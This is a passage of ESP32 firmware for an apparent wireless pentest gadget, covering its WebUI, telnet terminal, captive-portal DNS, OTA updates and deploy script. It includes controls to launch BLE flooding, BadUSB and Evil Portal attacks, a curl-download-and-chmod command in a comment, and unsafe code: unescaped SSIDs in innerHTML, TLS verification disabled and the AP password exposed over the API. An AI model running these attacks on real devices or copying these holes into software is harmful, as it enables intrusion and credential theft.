    document.getElementById('dash-fwsize').textContent=(d.fwSize||'--')+' KB';
    document.getElementById('dash-sd').textContent=d.sdOk||'--';
    document.getElementById('dash-sdsize').textContent=(d.sdSize||'--')+' MB';
    document.getElementById('dash-wmode').textContent=d.wifiMode||'--';
    document.getElementById('dash-ip').textContent=d.ip||'--';
    document.getElementById('dash-mac').textContent=d.mac||'--';
    document.getElementById('dash-rssi').textContent=(d.rssi||'--')+' dBm';
    // Update status pill
    var stEl=document.getElementById('dash-status');
    var st=d.status||'idle';
    if(st==='attack'){stEl.textContent='● 攻击中';stEl.className='pill red'}
    else if(st==='defense'){stEl.textContent='● 防御中';stEl.className='pill blue'}
    else{stEl.textContent='● 运行中';stEl.className='pill green'}
    var pct=d.totalRam?Math.round((1-d.freeRam/d.totalRam)*100):0;
    document.getElementById('dash-ram-bar').style.width=pct+'%';
    document.getElementById('dash-ram-pct').textContent=pct+'%';
    document.getElementById('dash-flash-bar').style.width=(d.flashPct||69)+'%';
    document.getElementById('dash-flash-pct').textContent=(d.flashPct||69)+'%';
    // header
    document.getElementById('h-ram').textContent=(d.freeRam||'--')+' KB';
    document.getElementById('h-flash').textContent=(d.flashPct||69)+'%';
    if(d.wifiMode&&d.wifiMode!=='OFF'){
      document.getElementById('h-wifi').style.display='inline';
      document.getElementById('h-ssid').textContent=d.ssid||'--';
    }
    // network page
    document.getElementById('net-mode').textContent=d.wifiMode||'--';
    document.getElementById('net-ssid').textContent=d.ssid||'--';
    document.getElementById('net-ip').textContent=d.ip||'--';
    document.getElementById('net-mac').textContent=d.mac||'--';
    // about page
    document.getElementById('abt-ver').textContent=d.version||'--';
    document.getElementById('abt-code').textContent=d.codename||'--';
    // update page
    document.getElementById('upd-current').textContent=d.version||'--';
  }).catch(function(e){
    document.getElementById('dash-status').textContent='● 未知状态';
    document.getElementById('dash-status').className='pill red';
    console.error('sysinfo error:',e);
  });
}
// ═══ WIFI ═══
function wifiScan(){document.getElementById('wifi-list').innerHTML='<div style="color:#444">扫描中...</div>';
fetch('/api/wifi_scan').then(function(r){return r.json()}).then(function(d){
  var h='';d.forEach(function(n){h+='<div class="scan-row"><span class="ssid" onclick="document.getElementById(\'conn-ssid\').value=\''+n.ssid.replace(/'/g,"\\'")+'\'" style="cursor:pointer" title="点击填入">'+n.ssid+'</span><span class="rssi">'+n.r+' dBm</span><span class="ch">CH '+n.ch+'</span></div>'});
  if(!d.length)h='<div style="color:#444;text-align:center;padding:20px">未发现网络</div>';
  document.getElementById('wifi-list').innerHTML=h;
}).catch(function(e){document.getElementById('wifi-list').innerHTML='<div style="color:#f00">扫描失败</div>'})}
function wifiConnect(){var ssid=document.getElementById('conn-ssid').value.trim();var pass=document.getElementById('conn-pass').value.trim();if(!ssid)return;
fetch('/api/wifi_connect?ssid='+encodeURIComponent(ssid)+'&pass='+encodeURIComponent(pass)).then(function(r){return r.text()}).then(function(t){toast(t);setTimeout(refreshDash,3000)})}
function wifiDisconnect(){fetch('/api/wifi_disconnect').then(function(){toast('已断开');setTimeout(refreshDash,2000)})}
// ═══ PORT SCAN ═══
function portScan(){var ip=document.getElementById('ps-ip').value.trim();if(!ip)return;
var sp=document.getElementById('ps-start').value.trim()||'1';var ep=document.getElementById('ps-end').value.trim()||'1024';
var r=document.getElementById('ps-result');r.textContent='扫描 '+ip+':'+sp+'-'+ep+'...';
fetch('/api/portscan?ip='+encodeURIComponent(ip)+'&start='+sp+'&end='+ep).then(function(x){return x.json()}).then(function(d){
var h='';d.results.forEach(function(p){h+='[+] '+p.port+'/tcp\n'});
if(!d.results.length)h='未发现开放端口\n';
r.textContent=h}).catch(function(e){r.textContent='失败: '+e})}
// ═══ ATTACK ═══
function atkAction(type,action){
  if(action==='stop'){
    // Stop via defense
    fetch('/api/attack?type=defense&action=start').then(function(){toast('已停止');resetAtkButtons()});
    return;
  }
  var labels={ble:'BLE 泛洪',badusb:'BadUSB',portal:'Evil Portal',defense:'Defense'};
  fetch('/api/attack?type='+type+'&action=start').then(function(r){return r.text()}).then(function(t){
    toast(labels[type]+' 已启动');resetAtkButtons();
    if(type==='ble'){document.getElementById('btn-ble-start').style.display='none';document.getElementById('btn-ble-stop').style.display=''}
    if(type==='badusb'){document.getElementById('btn-badusb-start').style.display='none';document.getElementById('btn-badusb-stop').style.display=''}
    if(type==='portal'){document.getElementById('btn-portal-start').style.display='none';document.getElementById('btn-portal-stop').style.display=''}
  }).catch(function(e){toast('失败: '+e)})
}
function resetAtkButtons(){
  ['ble','badusb','portal'].forEach(function(t){
    document.getElementById('btn-'+t+'-start').style.display='';
    document.getElementById('btn-'+t+'-stop').style.display='none';
  });
}
function saveBadusb(){var s=document.getElementById('badusb-script').value.trim();if(!s)return;
fetch('/api/badusb/save?script='+encodeURIComponent(s)).then(function(){toast('脚本已保存')})}
// ═══ FILES ═══
var filePath='/';
function fileList(p){if(p!==undefined)filePath=p;
document.getElementById('file-path').textContent=filePath;
var h='';if(filePath!=='/'){h+='<div class="file-row" onclick="fileList(\''+(filePath.substring(0,filePath.lastIndexOf('/'))||'/')+'\')"><span class="name" style="color:var(--cyan)">📁 ../</span></div>'}
fetch('/api/files?path='+encodeURIComponent(filePath)).then(function(r){return r.json()}).then(function(d){
d.forEach(function(f){
if(f.dir){h+='<div class="file-row" onclick="fileList(\''+filePath.replace(/\/$/,'')+'/'+f.name+'\')"><span class="name" style="color:var(--green)">📁 '+f.name+'/</span></div>'}
else{h+='<div class="file-row"><span class="name">📄 '+f.name+'</span><span class="size">'+fmtSize(f.size)+'</span>'+
'<button class="btn outline sm" onclick="fileDownload(\''+filePath.replace(/\/$/,'')+'/'+f.name+'\')">⬇</button>'+
'<button class="btn outline sm" onclick="fileDelete(\''+filePath.replace(/\/$/,'')+'/'+f.name+'\')" style="color:var(--red)">✕</button></div>'}
});
if(!d.length)h+='<div style="color:#444;text-align:center;padding:20px">空目录</div>';
document.getElementById('file-list').innerHTML=h;
}).catch(function(){document.getElementById('file-list').innerHTML='<div style="color:var(--red);text-align:center;padding:20px">无 SD 卡</div>'})}
function fmtSize(s){if(s<1024)return s+'B';if(s<1048576)return (s/1024).toFixed(1)+'K';return (s/1048576).toFixed(1)+'M'}
function fileDelete(p){if(!confirm('删除 '+p+'?'))return;fetch('/api/files/delete?path='+encodeURIComponent(p)).then(function(){fileList();toast('已删除')})}
function fileDownload(p){window.open('/api/files/download?path='+encodeURIComponent(p))}
function fileUpload(i){var f=i.files[0];if(!f)return;var x=new XMLHttpRequest();x.open('POST','/api/files/upload');x.onload=function(){fileList();toast('上传完成')};x.send(f)}
// ═══ UPDATE ═══
function loadUpdateUrl(){fetch('/api/update_url').then(function(r){return r.json()}).then(function(d){var u=d.url||'';document.getElementById('upd-url').textContent=u||'未配置';document.getElementById('upd-url-input').value=u}).catch(function(){document.getElementById('upd-url').textContent='未配置'})}
function saveUpdateUrl(){var u=document.getElementById('upd-url-input').value.trim();if(!u)return;
fetch('/api/update_url?url='+encodeURIComponent(u)).then(function(){toast('URL 已保存');loadUpdateUrl()})}
function checkUpdate(){document.getElementById('upd-latest').textContent='检查中...';
fetch('/api/check_update').then(function(r){return r.json()}).then(function(d){
if(d.error){document.getElementById('upd-latest').textContent=d.error;return}
var l=d.latest||{};
document.getElementById('upd-latest').textContent=(l.version||'--')+' ('+(l.codename||'')+')';
document.getElementById('upd-date').textContent=l.date||'--';
document.getElementById('upd-size').textContent=l.size?Math.round(l.size/1024)+' KB':'--'})}
function doUpdate(){if(!confirm('确认下载并安装固件更新？'))return;
document.getElementById('upd-latest').textContent='下载中...';
fetch('/api/do_update').then(function(r){return r.text()}).then(function(t){toast(t)})}
function otaUpload(i){var f=i.files[0];if(!f)return;var bar=document.getElementById('ota-bar');var st=document.getElementById('ota-status');
var x=new XMLHttpRequest();x.open('POST','/update?csrf='+csrfToken);
x.upload.onprogress=function(e){if(e.lengthComputable){bar.style.width=(e.loaded/e.total*100)+'%';st.textContent=Math.round(e.loaded/1024)+'/'+Math.round(e.total/1024)+' KB'}}
x.onload=function(){bar.style.width='100%';st.textContent='刷写完成，设备将重启...';setTimeout(function(){location.reload()},5000)}
x.onerror=function(){st.textContent='上传失败';st.style.color='var(--red)'}
x.send(f)}
// ═══ INIT ═══
var csrfToken='';
fetch('/api/csrf_token').then(function(r){return r.text()}).then(function(t){csrfToken=t});
setInterval(refreshDash,5000);
refreshDash();loadUpdateUrl();fileList();
</script>
</body>
</html>
)rawliteral";

// ═══════════════ SYSTEM: Terminal (Telnet) ═══════════════
static void sys_term() {
    sd_init();
    tft_soft_restore();

    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Terminal");
    
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 16, "远程终端 端口23", C_WHITE, C_BLACK);

    cnfont_print(4, CONTENT_Y + 32, "地址:", C_CYAN, C_BLACK);
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(48, CONTENT_Y + 32);
    if (g_wifi_mode == WM_AP) {
        tft.print(WiFi.softAPIP().toString());
    } else if (g_wifi_mode == WM_STA) {
        tft.print(WiFi.localIP().toString());
    } else {
        tft.print("N/A");
    }

    cnfont_print(4, CONTENT_Y + 48, "连接:", C_WHITE, C_BLACK);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(48, CONTENT_Y + 48);
    tft.print("telnet ");
    if (g_wifi_mode == WM_AP) {
        tft.print(WiFi.softAPIP().toString());
    } else if (g_wifi_mode == WM_STA) {
        tft.print(WiFi.localIP().toString());
    }

    cnfont_print(4, CONTENT_Y + 64, "命令: help ls cat", C_YELLOW, C_BLACK);
    cnfont_print(4, CONTENT_Y + 80, "wget wifi df free...", C_YELLOW, C_BLACK);

    scr_draw_bottom("A:启动", "B:返回");
    
    // Start Telnet server
    bool t_started = false;
    if (g_wifi_mode == WM_AP || g_wifi_mode == WM_STA) {
        term_telnet_begin();
        t_started = true;
    }
    
    while (true) {
        if (t_started) term_telnet_loop();
        
        ButtonEvent a = buttons_get_event(BTN_ID_A);
        ButtonEvent b = buttons_get_event(BTN_ID_B);
        
        if (b == BTN_EVENT_PRESS) break;
        if (a == BTN_EVENT_PRESS) {
            if (!t_started && (g_wifi_mode == WM_AP || g_wifi_mode == WM_STA)) {
                term_telnet_begin();
                t_started = true;
                tft.fillRect(4, CONTENT_Y + 80, SCR_W - 8, 20, C_BLACK);
                cnfont_print(4, CONTENT_Y + 80, "远程已启动!", C_GREEN, C_BLACK);
            }
        }
        delay(20);
    }
    
    term_telnet_stop();
}

// ═══════════════ WebUI restore after attack ═══════════════
// Called when attack functions (triggered from WebUI) finish.
// Restores AP mode and re-enters WebUI so the management page stays online.
static void sys_webui();  // forward declaration

static void webui_restore_after_attack() {
    if (!g_web_restore) return;
    g_web_restore = false;
    
    // Stop any lingering attack
    g_wifi_atk = ATK_OFF;
    g_ble_atk = ATK_OFF;
    g_wifi_def = ATK_OFF;
    g_ble_on = false;
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("WebUI Restore");
    tft.setTextFont(1);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 16);
    tft.print("Restoring AP...");
    
    // Restore AP mode
    WiFi.mode(WIFI_AP);
    WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
    g_wifi_mode = WM_AP;
    delay(500);
    
    tft.setCursor(4, CONTENT_Y + 28);
    tft.print("WebUI: ");
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.print("http://");
    tft.print(WiFi.softAPIP().toString());
    
    tft.setTextColor(C_RED, C_BLACK);
    tft.setCursor(4, SCR_H - 22);
    tft.print("B:Menu");
    
    tft.setTextColor(C_GREEN, C_BLACK);
    tft.setCursor(60, SCR_H - 22);
    tft.print("A:Reopen WebUI");
    
    while (true) {
        ButtonEvent a = buttons_get_event(BTN_ID_A);
        ButtonEvent b = buttons_get_event(BTN_ID_B);
        if (b == BTN_EVENT_PRESS) break;
        if (a == BTN_EVENT_PRESS) {
            // Re-enter WebUI
            sys_webui();
            break;
        }
        delay(20);
    }
}

// JSON string escape helper - escapes ", \, and control chars
static String jsonEscape(const String& s) {
    String out;
    out.reserve(s.length() + 8);
    for (unsigned int i = 0; i < s.length(); i++) {
        char c = s[i];
        if (c == '"') out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else if (c < 0x20) { char hex[8]; snprintf(hex, sizeof(hex), "\\u%04x", (unsigned char)c); out += hex; }
        else out += c;
    }
    return out;
}

// ═══════════════ 双WiFi模式 (APSTA) ═══════════════
// 同时作为STA连接家里WiFi + AP供手机/终端连接
// 避免网络来回切换, 减少延迟
static int g_wifi_reconnect_count = 0;  // 重连次数

static void wifi_start_dual(const char* sta_ssid, const char* sta_pass) {
    Serial.println("[WIFI] Starting dual mode (APSTA)...");

    // Save STA credentials
    if (sta_ssid) strncpy(g_sta_ssid, sta_ssid, 32);
    if (sta_pass) strncpy(g_sta_pass, sta_pass, 32);
    g_sta_ssid[32] = '\0';
    g_sta_pass[32] = '\0';

    // Switch to APSTA mode
    WiFi.mode(WIFI_AP_STA);

    // Start AP (for phone/terminal direct connection)
    WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
    Serial.printf("[WIFI] AP: %s on ch%d\n", g_web_ap_ssid, g_web_ap_ch);

    // Connect to home WiFi as STA (for internet)
    if (strlen(g_sta_ssid) > 0) {
        WiFi.begin(g_sta_ssid, g_sta_pass);
        Serial.printf("[WIFI] STA: connecting to %s...\n", g_sta_ssid);

        uint32_t start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
            delay(200);
            yield();
        }

        if (WiFi.status() == WL_CONNECTED) {
            g_wifi_conn = true;
            g_wifi_mode = WM_STA;  // Still report as STA for status
            g_dual_wifi = true;
            Serial.printf("[WIFI] STA connected! IP: %s\n", WiFi.localIP().toString().c_str());

            // Configure DNS for internet access
            IPAddress dns1(8, 8, 8, 8);
            IPAddress dns2(114, 114, 114, 114);
            WiFi.config(WiFi.localIP(), WiFi.gatewayIP(), WiFi.subnetMask(), dns1, dns2);
        } else {
            Serial.println("[WIFI] STA connection failed, continuing in AP-only mode");
            g_dual_wifi = false;
            g_wifi_conn = false;
        }
    } else {
        Serial.println("[WIFI] No STA credentials, AP-only mode");
        g_dual_wifi = false;
    }

    g_last_wifi_check = millis();
}

// Check and maintain dual WiFi connection (call from loop)
static void wifi_dual_maintain() {
    if (!g_dual_wifi) return;

    // Check every 30 seconds
    if (millis() - g_last_wifi_check < 30000) return;
    g_last_wifi_check = millis();

    // Check STA connection
    if (WiFi.status() != WL_CONNECTED) {
        g_wifi_reconnect_count++;
        Serial.printf("[WIFI] STA disconnected! Reconnecting (attempt %d)...\n", g_wifi_reconnect_count);

        // Don't disconnect AP, just reconnect STA
        WiFi.begin(g_sta_ssid, g_sta_pass);

        uint32_t start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
            delay(200);
            yield();
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.println("[WIFI] STA reconnected!");
            g_wifi_conn = true;
            g_wifi_reconnect_count = 0;
        } else {
            Serial.println("[WIFI] STA reconnect failed, will retry...");
            // Keep AP running, don't switch modes
        }
    } else {
        // Connected, reset counter
        if (g_wifi_reconnect_count > 0) {
            g_wifi_reconnect_count = 0;
            Serial.println("[WIFI] STA connection stable");
        }
    }
}

static void sys_webui() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
    g_wifi_mode = WM_AP;
    g_web_cmd_pending = false;
    tft_soft_restore();
    
    // ── Generate CSRF token for OTA protection ──
    char csrf_token[17];
    snprintf(csrf_token, sizeof(csrf_token), "%08x%08x", 
             (unsigned int)esp_random(), (unsigned int)esp_random());
    Serial.printf("[WebUI] CSRF token: %s\n", csrf_token);
    
    IPAddress ip = WiFi.softAPIP();
    
    DNSServer dns;
    dns.start(53, "*", ip);
    
    WebServer server(80);
    
    // ── Main page ──
    server.on("/", HTTP_GET, [&]() {
        server.send(200, "text/html", WEBUI_HTML);
    });

    // ── Serve embedded xm command script ──
    // Usage: curl -s http://192.168.4.1/xm -o $PREFIX/bin/xm && chmod +x $PREFIX/bin/xm
    server.on("/xm", HTTP_GET, [&]() {
        server.sendHeader("Content-Disposition", "attachment; filename=xm");
        server.send(200, "application/octet-stream", XM_SCRIPT);
    });

    // ── 一键部署脚本下载 ──
    server.on("/deploy", HTTP_GET, [&]() {
        String script = "#!/usr/bin/env python3\n";
        script += "# -*- coding: utf-8 -*-\n";
        script += "# 小喵系统一键部署脚本\n";
        script += "# 自动检测设备、下载固件、刷入ESP32\n";
        script += "import subprocess, sys, os, json, urllib.request, time\n\n";
        script += "DEVICE_IP = '192.168.4.1'\n";
        script += "VERSION_URL = 'http://' + DEVICE_IP + '/api/sysinfo'\n";
        script += "DEPLOY_URL = 'http://' + DEVICE_IP + '/api/deploy_info'\n\n";
        script += "def get_device_info():\n";
        script += "    try:\n";
        script += "        resp = urllib.request.urlopen(VERSION_URL, timeout=5)\n";
        script += "        return json.loads(resp.read())\n";
        script += "    except Exception as e:\n";
        script += "        print(f'无法连接设备: {e}')\n";
        script += "        return None\n\n";
        script += "def get_deploy_info():\n";
        script += "    try:\n";
        script += "        resp = urllib.request.urlopen(DEPLOY_URL, timeout=5)\n";
        script += "        return json.loads(resp.read())\n";
        script += "    except:\n";
        script += "        return None\n\n";
        script += "def main():\n";
        script += "    print('=' * 50)\n";
        script += "    print('  小喵系统一键部署工具')\n";
        script += "    print('=' * 50)\n\n";
        script += "    # 获取设备信息\n";
        script += "    info = get_device_info()\n";
        script += "    if info:\n";
        script += "        print(f'设备版本: v{info.get(\"version\", \"?\")}')\n";
        script += "        print(f'芯片: {info.get(\"chip\", \"ESP32\")}')\n";
        script += "        print(f'Flash使用: {info.get(\"flashPct\", \"?\")}%')\n";
        script += "        print(f'WiFi模式: {info.get(\"wifiMode\", \"?\")}')\n";
        script += "        print()\n";
        script += "    else:\n";
        script += "        print('无法获取设备信息,请检查连接')\n";
        script += "        sys.exit(1)\n\n";
        script += "    # 获取部署信息\n";
        script += "    deploy = get_deploy_info()\n";
        script += "    if not deploy:\n";
        script += "        print('无法获取部署信息')\n";
        script += "        sys.exit(1)\n\n";
        script += "    print(f'更新服务器: {deploy.get(\"update_url\", \"?\")}')\n";
        script += "    print(f'最新版本: v{deploy.get(\"latest_version\", \"?\")}')\n";
        script += "    print(f'当前版本: v{deploy.get(\"current_version\", \"?\")}')\n";
        script += "    print()\n\n";
        script += "    # 检查是否需要更新\n";
        script += "    if deploy.get('need_update'):\n";
        script += "        print('发现新版本!')\n";
        script += "        print(f'建议升级到 v{deploy.get(\"latest_version\", \"?\")}')\n";
        script += "        print()\n";
        script += "        choice = input('是否现在更新? (y/n): ')\n";
        script += "        if choice.lower() == 'y':\n";
        script += "            print('\\n请在设备上: 系统 > 系统更新 > 按A键')\n";
        script += "            print('或访问WebUI进行OTA更新')\n";
        script += "    else:\n";
        script += "        print('系统已是最新版本')\n\n";
        script += "    print('\\n部署完成!')\n";
        script += "    print(f'WebUI: http://{DEVICE_IP}')\n";
        script += "    print(f'终端: telnet {DEVICE_IP} 23')\n\n";
        script += "if __name__ == '__main__':\n";
        script += "    main()\n";

        server.sendHeader("Content-Disposition", "attachment; filename=xiaomiao_deploy.py");
        server.send(200, "text/x-python; charset=utf-8", script);
    });

    // ── CSRF Token endpoint (for OTA upload protection) ──
    server.on("/api/csrf_token", HTTP_GET, [&]() {
        server.send(200, "text/plain", csrf_token);
    });
    
    // ── Captive portal probe URLs (CRITICAL: prevent redirect loop) ──
    // Android
    server.on("/generate_204", HTTP_GET, [&]() {
        server.send(204, "text/plain", "");
    });
    // Apple
    server.on("/hotspot-detect.html", HTTP_GET, [&]() {
        server.sendHeader("Location", "/", true);
        server.send(302, "text/plain", "");
    });
    // Windows
    server.on("/ncsi.txt", HTTP_GET, [&]() {
        server.send(200, "text/plain", "Microsoft NCSI");
    });
    server.on("/connecttest.txt", HTTP_GET, [&]() {
        server.send(200, "text/plain", "Microsoft Connect Test");
    });
    // Others
    server.on("/success.txt", HTTP_GET, [&]() {
        server.send(200, "text/plain", "success");
    });
    server.on("/favicon.ico", HTTP_GET, [&]() {
        server.send(204, "text/plain", "");
    });
    server.on("/canonical.html", HTTP_GET, [&]() {
        server.sendHeader("Location", "/", true);
        server.send(302, "text/plain", "");
    });
    
    // ── API: Device Status ──
    server.on("/api/status", HTTP_GET, [&]() {
        String atk_state = "IDLE";
        if (g_wifi_atk == ATK_RUNNING || g_ble_atk == ATK_RUNNING) atk_state = "ATTACK";
        else if (g_wifi_def == ATK_RUNNING) atk_state = "DEFENSE";
        else if (g_wifi_mode == WM_STA) atk_state = "SCAN";
        
        String json = "{";
        json += "\"ram\":" + String(ESP.getFreeHeap() / 1024) + ",";
        json += "\"temp\":" + String(temperatureRead(), 1) + ",";
        json += "\"sd\":\"" + String(sd_ok ? "OK" : "N/A") + "\",";
        json += "\"uptime\":\"" + String(millis() / 1000) + "s\",";
        json += "\"wmode\":\"" + String(g_wifi_mode == WM_OFF ? "OFF" : g_wifi_mode == WM_STA ? "STA" : "AP") + "\",";
        json += "\"ip\":\"" + ip.toString() + "\",";
        json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
        json += "\"tx\":" + String(g_packets_sent + g_beacons_sent) + ",";
        json += "\"rx\":" + String(g_traffic_rx) + ",";
        json += "\"blocked\":" + String(g_packets_blocked) + ",";
        json += "\"blecnt\":" + String(g_ble_spam_cnt) + ",";
        json += "\"fw\":\"" FW_VERSION "\",";
        json += "\"status\":\"" + atk_state + "\"";
        json += "}";
        server.send(200, "application/json", json);
    });
    
    // ── API: System Info (comprehensive) ──
    server.on("/api/sysinfo", HTTP_GET, [&]() {
        uint32_t totalHeap = ESP.getHeapSize();
        uint32_t freeHeap = ESP.getFreeHeap();
        uint32_t psram = ESP.getPsramSize();
        String wmode = (g_wifi_mode == WM_OFF) ? "OFF" : 
                       (g_wifi_mode == WM_STA) ? "STA" : 
                       (g_wifi_mode == WM_AP) ? "AP" : "AP+STA";
        String ssid = "N/A";
        if (g_wifi_mode == WM_STA) ssid = WiFi.SSID();
        else if (g_wifi_mode == WM_AP) ssid = String(g_web_ap_ssid);
        
        String json = "{";
        json += "\"version\":\"" FW_VERSION "\",";
        json += "\"codename\":\"Neo-UI\",";
        json += "\"uptime\":\"" + String(millis() / 1000) + "s\",";
        json += "\"chip\":\"ESP32\",";
        json += "\"totalRam\":" + String(totalHeap / 1024) + ",";
        json += "\"freeRam\":" + String(freeHeap / 1024) + ",";
        json += "\"psram\":" + String(psram / 1024) + ",";
        json += "\"fwSize\":" + String(ESP.getSketchSize() / 1024) + ",";
        uint32_t sketchSpace = ESP.getFreeSketchSpace();
        uint32_t sketchSize = ESP.getSketchSize();
        int flashPct = sketchSpace > 0 ? (int)((float)sketchSize / (sketchSize + sketchSpace) * 100) : 69;
        json += "\"flashPct\":" + String(flashPct) + ",";
        json += "\"sdOk\":\"" + String(sd_ok ? "OK" : "N/A") + "\",";
        json += "\"sdSize\":\"N/A\",";
        json += "\"wifiMode\":\"" + wmode + "\",";
        json += "\"ssid\":\"" + jsonEscape(ssid) + "\",";
        json += "\"ip\":\"" + ip.toString() + "\",";
        json += "\"mac\":\"" + WiFi.macAddress() + "\",";
        json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
        // Status: indicate attack/idle/scan state
        String status = "idle";
        if (g_wifi_atk == ATK_RUNNING || g_ble_atk == ATK_RUNNING) status = "attack";
        else if (g_wifi_def == ATK_RUNNING) status = "defense";
        json += "\"status\":\"" + status + "\"";
        json += "}";
        server.send(200, "application/json", json);
    });

    // ── API: 部署信息 (供一键部署脚本使用) ──
    server.on("/api/deploy_info", HTTP_GET, [&]() {
        String json = "{";
        json += "\"current_version\":\"" FW_VERSION "\",";
        json += "\"update_url\":\"" + String(g_update_url) + "\",";
        json += "\"device_ip\":\"" + ip.toString() + "\",";
        json += "\"webui\":\"http://" + ip.toString() + "\",";
        json += "\"telnet\":\"telnet " + ip.toString() + " 23\",";

        // Try to get latest version info
        if (strlen(g_update_url) > 0 && g_wifi_conn) {
            WiFiClient* plain = nullptr;
            WiFiClientSecure* ssl = nullptr;
            HTTPClient http;
            bool isHttps = (strncmp(g_update_url, "https", 5) == 0);

            if (isHttps) {
                ssl = new WiFiClientSecure();
                ssl->setInsecure();
                http.begin(*ssl, g_update_url);
            } else {
                plain = new WiFiClient();
                http.begin(*plain, g_update_url);
            }
            http.setTimeout(5000);
            int code = http.GET();

            if (code == 200) {
                String body = http.getString();
                DynamicJsonDocument doc(2048);
                if (deserializeJson(doc, body) == DeserializationError::Ok) {
                    const char* lv = doc["latest"]["version"];
                    if (lv) {
                        json += "\"latest_version\":\"" + String(lv) + "\",";
                        // Compare versions
                        int cp1=0,cp2=0,cp3=0,rp1=0,rp2=0,rp3=0;
                        sscanf(FW_VERSION, "%d.%d.%d", &cp1, &cp2, &cp3);
                        sscanf(lv, "%d.%d.%d", &rp1, &rp2, &rp3);
                        bool need = (rp1 > cp1 || (rp1==cp1 && rp2 > cp2) || (rp1==cp1 && rp2==cp2 && rp3 > cp3));
                        json += "\"need_update\":" + String(need ? "true" : "false");
                    } else {
                        json += "\"latest_version\":\"unknown\",";
                        json += "\"need_update\":false";
                    }
                } else {
                    json += "\"latest_version\":\"parse_error\",";
                    json += "\"need_update\":false";
                }
            } else {
                json += "\"latest_version\":\"unreachable\",";
                json += "\"need_update\":false";
            }
            http.end();
            if (plain) delete plain;
            if (ssl) delete ssl;
        } else {
            json += "\"latest_version\":\"no_wifi\",";
            json += "\"need_update\":false";
        }
        json += "}";
        server.send(200, "application/json", json);
    });

    // ── API: 设置更新服务器地址 ──
    server.on("/api/set_update_url", HTTP_POST, [&]() {
        String body = server.arg("plain");
        // Extract URL from JSON
        int p = body.indexOf("\"url\"");
        if (p < 0) {
            server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing url\"}");
            return;
        }
        p = body.indexOf("\"", p + 5);
        if (p < 0) {
            server.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid json\"}");
            return;
        }
        p++;
        String url;
        while (p < (int)body.length() && body[p] != '"') {
            if (body[p] == '\\') p++;
            else url += body[p];
            p++;
        }

        if (url.length() == 0 || url.length() > 127) {
            server.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid url length\"}");
            return;
        }

        // Save to global
        strncpy(g_update_url, url.c_str(), 127);
        g_update_url[127] = '\0';

        // Extract base URL
        int lastSlash = url.lastIndexOf('/');
        if (lastSlash > 8) {  // Keep http:// or https://
            strncpy(g_update_base, url.substring(0, lastSlash + 1).c_str(), 127);
            g_update_base[127] = '\0';
        }

        // Persist to NVS
        update_url_save(g_update_url);

        Serial.printf("[WEB] Update URL set to: %s\n", g_update_url);

        // Reset update check timer to trigger immediate check
        g_last_update_check = 0;

        server.send(200, "application/json", "{\"ok\":true,\"url\":\"" + url + "\"}");
    });

    // ── API: 获取更新服务器地址 ──
    server.on("/api/get_update_url", HTTP_GET, [&]() {
        String json = "{";
        json += "\"url\":\"" + String(g_update_url) + "\",";
        json += "\"current_version\":\"" FW_VERSION "\",";
        if (g_update_available) {
            json += "\"update_available\":true,";
            json += "\"new_version\":\"" + String(g_update_new_ver) + "\"";
        } else {
            json += "\"update_available\":false";
        }
        json += "}";
        server.send(200, "application/json", json);
    });

    // ── API: Network Config (GET) ──
    server.on("/api/net_config", HTTP_GET, [&]() {
        String mac = WiFi.softAPmacAddress();
        String json = "{";
        json += "\"ssid\":\"" + String(g_web_ap_ssid) + "\",";
        json += "\"pass\":\"" + String(g_web_ap_pass) + "\",";
        json += "\"ch\":" + String(g_web_ap_ch) + ",";
        json += "\"maxc\":" + String(g_web_ap_max_cli) + ",";
        json += "\"hidden\":" + String(g_web_ap_hidden ? 1 : 0) + ",";
        json += "\"ip\":\"" + ip.toString() + "\",";
        json += "\"mac\":\"" + mac + "\",";
        json += "\"txpow\":\"" + String(WiFi.getTxPower()) + "dBm\",";
        json += "\"dns\":\"" + ip.toString() + "\"";
        json += "}";
        server.send(200, "application/json", json);
    });
    
    // ── API: AP Config (POST) ──
    server.on("/api/ap_config", HTTP_POST, [&]() {
        String body = server.arg("plain");
        // Parse simple JSON: {"ssid":"...","pass":"...","ch":1,"maxc":8,"hidden":0}
        auto extract = [&](String key) -> String {
            int p = body.indexOf("\"" + key + "\"");
            if (p < 0) return "";
            p = body.indexOf(":", p);
            if (p < 0) return "";
            p++;
            while (p < (int)body.length() && (body[p] == ' ' || body[p] == '"')) p++;
            String val;
            if (body[p] == '"') {
                p++;
                while (p < (int)body.length() && body[p] != '"') {
                    if (body[p] == '\\') p++;
                    else val += body[p];
                    p++;
                }
            } else {
                while (p < (int)body.length() && (isDigit(body[p]) || body[p] == '-')) {
                    val += body[p];
                    p++;
                }
            }
            return val;
        };
        
        String ssid = extract("ssid");
        String pass = extract("pass");
        String ch = extract("ch");
        String maxc = extract("maxc");
        String hidden = extract("hidden");
        
        if (ssid.length() > 0 && ssid.length() <= 32) {
            strncpy(g_web_ap_ssid, ssid.c_str(), 32);
            g_web_ap_ssid[32] = 0;
        }
        if (pass.length() > 0 && pass.length() <= 32) {
            strncpy(g_web_ap_pass, pass.c_str(), 32);
